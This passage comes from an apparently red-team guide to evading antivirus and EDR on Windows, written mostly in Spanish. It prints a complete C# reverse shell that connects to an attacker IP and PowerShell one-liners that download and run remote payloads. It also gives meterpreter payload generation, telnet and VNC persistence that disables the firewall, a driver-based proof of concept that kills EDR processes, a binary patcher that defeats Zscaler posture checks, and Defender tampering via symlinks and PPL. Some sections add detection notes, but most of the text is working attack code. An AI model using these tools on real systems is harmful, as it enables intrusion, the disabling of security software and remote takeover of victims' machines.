:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un poderoso mecanismo de registro en Windows que permite a las aplicaciones y componentes del sistema **registrar eventos**. Sin embargo, también puede ser utilizado por productos de seguridad para monitorizar y detectar actividades maliciosas.

De manera similar a cómo AMSI se desactiva (bypassea), también es posible hacer que la función **`EtwEventWrite`** del proceso en espacio de usuario retorne inmediatamente sin registrar ningún evento. Esto se hace parcheando la función en memoria para que retorne de inmediato, deshabilitando efectivamente el logging de ETW para ese proceso.

Puedes encontrar más información en **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Cargar binarios C# en memoria es conocido desde hace tiempo y sigue siendo una excelente forma de ejecutar tus herramientas post-explotación sin ser detectado por AV.

Dado que el payload se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.

La mayoría de los frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya ofrecen la capacidad de ejecutar ensamblados C# directamente en memoria, pero hay diferentes formas de hacerlo:

- **Fork\&Run**

Implica **spawnear un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar tu código malicioso y cuando termine, matar el proceso. Esto tiene tanto ventajas como desventajas. La ventaja del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso Beacon implant. Esto significa que si algo en nuestra acción de post-explotación sale mal o es detectado, hay una **mucho mayor probabilidad** de que nuestro **implant sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser detectado por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Se trata de inyectar el código malicioso de post-explotación **en su propio proceso**. De este modo, puedes evitar crear un nuevo proceso y que sea escaneado por AV, pero la desventaja es que si algo falla en la ejecución de tu payload, hay una **mucho mayor probabilidad** de **perder tu Beacon** ya que podría crashear.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre la carga de C# Assembly, consulta este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

También puedes cargar C# Assemblies **desde PowerShell**, echa un vistazo a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y al video de S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso usando otros lenguajes dando a la máquina comprometida acceso **al entorno del intérprete instalado en el Attacker Controlled SMB share**.

Al permitir el acceso a los Interpreter Binaries y al entorno en el share SMB puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.

El repo indica: Defender sigue escaneando los scripts pero al utilizar Go, Java, PHP, etc. tenemos **más flexibilidad para bypassear firmas estáticas**. Las pruebas con reverse shell scripts aleatorios no ofuscados en estos lenguajes han resultado exitosas.

## TokenStomping

Token stomping es una técnica que permite a un atacante **manipular el access token o un security product como un EDR o AV**, permitiéndole reducir sus privilegios de modo que el proceso no muera pero no tenga permisos para comprobar actividades maliciosas.

Para prevenir esto Windows podría **evitar que procesos externos** obtengan handles sobre los tokens de procesos de seguridad.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como se describe en [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es fácil desplegar Chrome Remote Desktop en un equipo víctima y luego usarlo para tomar el control y mantener persistencia:
1. Descarga desde https://remotedesktop.google.com/, haz clic en "Set up via SSH", y luego haz clic en el archivo MSI para Windows para descargar el MSI.
2. Ejecuta el instalador silenciosamente en la víctima (se requieren privilegios de administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vuelve a la página de Chrome Remote Desktop y haz clic en siguiente. El asistente te pedirá autorizar; haz clic en el botón Authorize para continuar.
4. Ejecuta el parámetro dado con algunos ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota el parámetro pin que permite establecer el pin sin usar la GUI).


## Advanced Evasion

Evasion es un tema muy complicado, a veces hay que tener en cuenta muchas fuentes de telemetría en un solo sistema, por lo que es prácticamente imposible mantenerse completamente indetectado en entornos maduros.

Cada entorno al que te enfrentes tendrá sus propias fortalezas y debilidades.

Te recomiendo ver esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener una base sobre técnicas de Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **eliminará partes del binario** hasta que **descubra qué parte Defender** marca como maliciosa y te la divida.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred) con una oferta web abierta del servicio en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hasta Windows 10, todas las versiones de Windows venían con un **Telnet server** que podías instalar (como administrador) haciendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que se **inicie** cuando el sistema arranque y **ejecútalo** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar el puerto de telnet** (stealth) y deshabilitar el firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Habilita la opción _Disable TrayIcon_
- Establece una contraseña en _VNC Password_
- Establece una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo **recién** creado _**UltraVNC.ini**_ dentro de la **victim**

#### **Conexión inversa**

El **attacker** debe **ejecutar en** su **host** el binario `vncviewer.exe -listen 5900` para que esté **preparado** para recibir una reverse **VNC connection**. Luego, en la **victim**: Inicia el daemon winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo no debes hacer varias cosas

- No inicies `winvnc` si ya está corriendo o provocarás un [popup](https://i.imgur.com/1SROTTl.png). verifica si está en ejecución con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o hará que se abra [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para ayuda o provocarás un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** el **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El Defender actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer reverse shell en C#

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usarlo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automática:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ejemplo de uso de python para build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR desde el espacio del kernel

Storm-2603 aprovechó una pequeña utilidad de consola conocida como **Antivirus Terminator** para desactivar las protecciones del endpoint antes de desplegar ransomware. La herramienta incluye su **propio driver vulnerable pero *signed*** y lo abusa para emitir operaciones privilegiadas en el kernel que incluso los servicios AV bajo Protected-Process-Light (PPL) no pueden bloquear.

Puntos clave
1. **Signed driver**: El archivo entregado en disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente firmado `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” de Antiy Labs. Debido a que el driver tiene una firma válida de Microsoft, se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalación del servicio**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el driver como un **servicio de kernel** y la segunda lo inicia para que `\\.\ServiceMouse` sea accesible desde el espacio de usuario.
3. **IOCTLs expuestos por el driver**
| IOCTL code | Capacidad                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar un proceso arbitrario por PID (usado para matar servicios Defender/EDR) |
| `0x990000D0` | Eliminar un archivo arbitrario en disco |
| `0x990001D0` | Descargar el driver y eliminar el servicio |

Prueba de concepto mínima en C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por qué funciona**: BYOVD evita por completo las protecciones en modo usuario; el código que se ejecuta en el kernel puede abrir procesos *protected*, terminarlos o manipular objetos del kernel independientemente de PPL/PP, ELAM u otras medidas de hardening.

Detección / Mitigación
•  Habilitar la lista de bloqueo de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows se niegue a cargar `AToolsKrnl64.sys`.  
•  Monitorizar la creación de nuevos servicios de kernel y alertar cuando un driver se cargue desde un directorio escribible por todos o no esté presente en la lista de permitidos (allow-list).  
•  Vigilar handles en modo usuario a objetos de dispositivo personalizados seguidos de llamadas `DeviceIoControl` sospechosas.

### Evasión de las comprobaciones de postura de Zscaler Client Connector mediante parcheo de binarios en disco

El **Client Connector** de Zscaler aplica las reglas de posture del dispositivo localmente y se apoya en Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño débiles hacen posible una evasión completa:

1. La evaluación de posture ocurre **enteramente del lado del cliente** (se envía un booleano al servidor).  
2. Los endpoints RPC internos solo validan que el ejecutable que se conecta esté **firmado por Zscaler** (vía `WinVerifyTrust`).

Al **parchear cuatro binarios firmados en disco** se pueden neutralizar ambos mecanismos:

| Binary | Lógica original parcheada | Resultado |
|--------|---------------------------|-----------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Siempre devuelve `1`, por lo que cada comprobación resulta conforme |
| `ZSAService.exe` | Llamada indirecta a `WinVerifyTrust` | Se NOP-ea ⇒ cualquier proceso (incluso sin firmar) puede conectarse a las tuberías RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Reemplazada por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Comprobaciones de integridad en el túnel | Cortocircuitadas |

Extracto mínimo del parcheador:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Después de reemplazar los archivos originales y reiniciar la pila de servicios:

* **Todos** los controles de postura muestran **verde/compatible**.
* Los binarios sin firmar o modificados pueden abrir los named-pipe RPC endpoints (p. ej. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso irrestricto a la red interna definida por las políticas de Zscaler.

Este estudio de caso demuestra cómo decisiones de confianza puramente del lado del cliente y comprobaciones simples de firmas pueden ser derrotadas con unos pocos parches de bytes.

## Abusar de Protected Process Light (PPL) para Manipular AV/EDR con LOLBINs

Protected Process Light (PPL) aplica una jerarquía firmante/nivel de modo que solo los procesos protegidos de igual o mayor nivel pueden manipularse entre sí. Desde un punto de vista ofensivo, si puedes lanzar legítimamente un binario habilitado para PPL y controlar sus argumentos, puedes convertir una funcionalidad benigna (p. ej., logging) en una primitiva de escritura limitada respaldada por PPL contra directorios protegidos usados por AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- El binario del sistema firmado `C:\Windows\System32\ClipUp.exe` se auto-inicia y acepta un parámetro para escribir un archivo de registro en una ruta especificada por el llamador.
- Cuando se ejecuta como proceso PPL, la escritura de archivos ocurre con respaldo PPL.
- ClipUp no puede parsear rutas que contienen espacios; use rutas cortas 8.3 para apuntar a ubicaciones normalmente protegidas.

8.3 short path helpers
- Listar nombres cortos: `dir /x` en cada directorio padre.
- Obtener ruta corta en cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicie el PPL-capable LOLBIN (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un lanzador (p. ej., CreateProcessAsPPL).
2) Pase el argumento de ruta de registro de ClipUp para forzar la creación de un archivo en un directorio AV protegido (p. ej., Defender Platform). Utilice nombres cortos 8.3 si es necesario.
3) Si el binario objetivo normalmente está abierto/bloqueado por el AV mientras se ejecuta (p. ej., MsMpEng.exe), programe la escritura en el arranque antes de que el AV se inicie instalando un servicio de autoarranque que se ejecute de forma fiable antes. Valide el orden de arranque con Process Monitor (boot logging).
4) En el reinicio, la escritura respaldada por PPL ocurre antes de que el AV bloquee sus binarios, corrompiendo el archivo objetivo e impidiendo el inicio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas y restricciones
- You cannot control the contents ClipUp writes beyond placement; the primitive is suited to corruption rather than precise content injection.
- Requires local admin/SYSTEM to install/start a service and a reboot window.
- Timing is critical: the target must not be open; boot-time execution avoids file locks.

Detecciones
- Creación de procesos de `ClipUp.exe` con argumentos inusuales, especialmente parentado por launchers no estándar, alrededor del arranque.
- Nuevos servicios configurados para auto-start binarios sospechosos y que consistentemente arrancan antes de Defender/AV. Investigar la creación/modificación de servicios antes de fallos de inicio de Defender.
- File integrity monitoring en los binarios de Defender/directorios Platform; creaciones/modificaciones inesperadas de archivos por procesos con flags protected-process.
- ETW/EDR telemetry: buscar procesos creados con `CREATE_PROTECTED_PROCESS` y uso anómalo de nivel PPL por binarios no-AV.

Mitigaciones
- WDAC/Code Integrity: restringir qué binarios firmados pueden ejecutarse como PPL y bajo qué padres; bloquear invocación de ClipUp fuera de contextos legítimos.
- Service hygiene: restringir creación/modificación de servicios de auto-start y monitorizar manipulación del orden de arranque.
- Ensure Defender tamper protection y early-launch protections estén habilitados; investigar errores de inicio que indiquen corrupción de binarios.
- Considerar deshabilitar la generación de nombres cortos 8.3 en volúmenes que alojan security tooling si es compatible con tu entorno (probar exhaustivamente).

Referencias para PPL y tooling
- Visión general de Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Referencia EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (validación de orden): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulación de Microsoft Defender mediante Platform Version Folder Symlink Hijack

Windows Defender elige la plataforma desde la que se ejecuta enumerando subcarpetas bajo:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Selecciona la subcarpeta con la cadena de versión lexicográficamente más alta (p. ej., `4.18.25070.5-0`), y luego inicia los procesos del servicio Defender desde allí (actualizando las rutas de servicio/registro en consecuencia). Esta selección confía en las entradas de directorio incluyendo directory reparse points (symlinks). Un administrador puede aprovechar esto para redirigir Defender a una ruta escribible por un atacante y lograr DLL sideloading o la interrupción del servicio.

Precondiciones
- Local Administrator (necesario para crear directorios/symlinks bajo la carpeta Platform)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Por qué funciona
- Defender bloquea escrituras en sus propias carpetas, pero su selección de plataforma confía en las entradas de directorio y elige la versión lexicográficamente más alta sin validar que el destino resuelva a una ruta protegida/confiable.

Paso a paso (ejemplo)
1) Preparar un clon escribible de la carpeta Platform actual, p. ej. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Cree un symlink de directorio de mayor versión dentro de Platform que apunte a su carpeta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selección del trigger (reboot recomendado):
```cmd
shutdown /r /t 0
```
4) Verificar que MsMpEng.exe (WinDefend) se ejecute desde la ruta redirigida:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Deberías observar la nueva ruta del proceso en `C:\TMP\AV\` y la configuración/registro del servicio que refleje esa ubicación.

Post-exploitation options
- DLL sideloading/code execution: Colocar/reemplazar DLLs que Defender carga desde su directorio de la aplicación para ejecutar código en los procesos de Defender. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Elimina el version-symlink para que en el siguiente inicio la ruta configurada no se resuelva y Defender falle al iniciarse:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Tenga en cuenta que esta técnica no proporciona escalado de privilegios por sí misma; requiere derechos de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Los Red teams pueden mover la evasión en tiempo de ejecución fuera del implant de C2 y dentro del propio módulo objetivo mediante el hooking de su Import Address Table (IAT) y redirigiendo APIs seleccionadas a través de position‑independent code (PIC) controlado por el atacante. Esto generaliza la evasión más allá de la pequeña superficie de API que exponen muchos kits (p. ej., CreateProcessA) y extiende las mismas protecciones a BOFs y a DLLs post‑explotación.

Enfoque de alto nivel
- Colocar un blob PIC junto al módulo objetivo usando un reflective loader (prepended o companion). El PIC debe ser self‑contained y position‑independent.
- Mientras la host DLL se carga, recorrer su IMAGE_IMPORT_DESCRIPTOR y parchear las entradas de la IAT para las imports objetivo (p. ej., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para que apunten a thin PIC wrappers.
- Cada PIC wrapper ejecuta evasiones antes de tail‑calling a la dirección real de la API. Las evasiones típicas incluyen:
  - Memory mask/unmask alrededor de la llamada (p. ej., encrypt beacon regions, RWX→RX, change page names/permissions) y luego restaurar después de la llamada.
  - Call‑stack spoofing: construir una pila benigna y transicionar a la API objetivo para que el análisis de la call‑stack resuelva a los frames esperados.
  - Para compatibilidad, exportar una interfaz para que un script Aggressor (o equivalente) pueda registrar qué APIs hookear para Beacon, BOFs y DLLs post‑ex.

Por qué IAT hooking aquí
- Funciona para cualquier código que utilice la import hookeada, sin modificar el código de la herramienta ni depender de Beacon para que haga de proxy de APIs específicas.
- Cubre DLLs post‑ex: hookear LoadLibrary* te permite interceptar cargas de módulos (p. ej., System.Management.Automation.dll, clr.dll) y aplicar el mismo enmascaramiento y evasión de call‑stack a sus llamadas API.
- Restaura el uso fiable de comandos post‑ex que crean procesos frente a detecciones basadas en call‑stack envolviendo CreateProcessA/W.

Esquema mínimo de IAT hook (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplica el parche después de relocations/ASLR y antes del primer uso de la import. Reflective loaders like TitanLdr/AceLdr demuestran hooking durante DllMain del módulo cargado.
- Mantén los wrappers mínimos y PIC-safe; resuelve la API real mediante el valor IAT original que capturaste antes del parcheo o vía LdrGetProcedureAddress.
- Usa transiciones RW → RX para PIC y evita dejar páginas escribibles y ejecutables.

Call‑stack spoofing stub
- Draugr‑style PIC stubs construyen una cadena de llamadas falsa (direcciones de retorno hacia módulos benignos) y luego pivotan hacia la API real.
- Esto derrota las detecciones que esperan pilas canónicas desde Beacon/BOFs hacia APIs sensibles.
- Combínalo con técnicas de stack cutting/stack stitching para aterrizar dentro de los frames esperados antes del prólogo de la API.

Operational integration
- Anteponer el reflective loader a las DLLs post‑ex para que el PIC y los hooks se inicialicen automáticamente cuando la DLL se cargue.
- Usa un script Aggressor para registrar APIs objetivo de modo que Beacon y BOFs se beneficien de forma transparente del mismo camino de evasión sin cambios de código.

Detection/DFIR considerations
